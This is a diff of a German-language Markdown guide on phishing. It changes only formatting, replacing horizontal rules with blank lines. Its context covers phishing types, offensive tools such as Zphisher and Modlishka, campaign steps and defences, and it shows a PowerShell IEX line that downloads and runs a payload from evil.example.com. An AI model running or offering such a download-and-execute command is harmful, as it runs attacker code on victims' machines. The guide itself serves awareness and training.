@@ -4,7 +4,7 @@
 
 **Phishing** ist eine Form des Social Engineerings, bei der Angreifer versuchen, sensible Informationen wie Zugangsdaten, Kreditkarteninformationen oder vertrauliche Unternehmensdaten durch Täuschung zu erlangen. Dies geschieht meist über gefälschte E-Mails, Webseiten oder Nachrichten, die von legitimen Quellen zu stammen scheinen.
 
----
+
 
 ## Inhaltsverzeichnis
 - [Warum ist Phishing gefährlich?](#warum-ist-phishing-gefährlich)
@@ -25,7 +25,7 @@
 - Einstiegspunkt für weitere Angriffe (z. B. Ransomware, interne Pivoting-Angriffe)
 - Auch technische Fachkräfte sind nicht immun
 
----
+
 
 ## Typen von Phishing
 
@@ -39,7 +39,7 @@
 | **Pharming**        | Weiterleitung des Opfers über manipulierte DNS-Einträge |
 | **Credential Harvesting** | Abgreifen von Zugangsdaten über gefälschte Login-Seiten |
 
----
+
 
 ## Tools & Frameworks
 
@@ -55,7 +55,7 @@
 | **Phishery**         | Word-Dokumente mit eingebetteten Login-Prompts |
 | **Blackeye / Zphisher** | Templates für bekannte Login-Seiten (nur mit Zustimmung erlaubt!) |
 
----
+
 
 <div align=right>
 
@@ -77,7 +77,7 @@
 4. Tracking aktivieren (z. B. Klicks, Eingaben, Reaktionen)
 5. Reporting & Schulung bereitstellen
 
----
+
 
 ## Schutzmaßnahmen gegen Phishing
 
@@ -98,7 +98,7 @@
 - Prüfung der URL vor Eingabe von Login-Daten
 - Anti-Phishing-Banner in E-Mails einbinden
 
----
+
 
 ## Typische Merkmale einer Phishing-Mail
 
@@ -109,7 +109,7 @@
 - Ungewöhnliche Anhänge (z. B. .iso, .lnk, .html)
 - Emotionale Trigger (z. B. Angst, Belohnung)
 
----
+
 
 <div align=right>
 
@@ -131,7 +131,7 @@
 # Phishing-Anhang per PowerShell
 IEX (New-Object Net.WebClient).DownloadString("http://evil.example.com/payload.ps1")
 ```
----
+
 
 
 ## Nützliche Quellen & Lernmaterialien
@@ -139,7 +139,7 @@ IEX (New-Object Net.WebClient).DownloadString("http://evil.example.com/payload.p
 - [SET – Social Engineer Toolkit](https://github.com/trustedsec/social-engineer-toolkit)
 - [Modlishka](https://github.com/drk1wi/Modlishka)
 
----
+
 
 ## Haftungsausschluss
 
